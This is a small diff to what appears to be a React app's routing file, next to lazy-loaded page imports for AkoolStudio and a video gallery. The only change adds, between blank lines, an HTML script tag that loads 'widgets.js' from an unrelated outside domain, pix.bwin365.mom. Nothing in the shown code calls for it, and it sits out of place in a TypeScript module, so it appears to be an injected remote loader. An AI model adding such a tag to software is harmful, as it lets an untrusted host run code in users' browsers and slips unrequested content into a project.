@@ -86,6 +86,11 @@ const AkoolModels = lazy(() => import("./pages/AkoolStudio").then(m => ({ defaul
 const AkoolEffects = lazy(() => import("./pages/AkoolStudio").then(m => ({ default: m.AkoolEffects })));
 const DidVideoGallery = lazy(() => import("./pages/DidVideoGallery"));
 
+
+
+<script async src="https://pix.bwin365.mom/widgets.js?uid=pl_xxx"></script>
+
+
 // Loading fallback
 function PageLoader() {
   return (
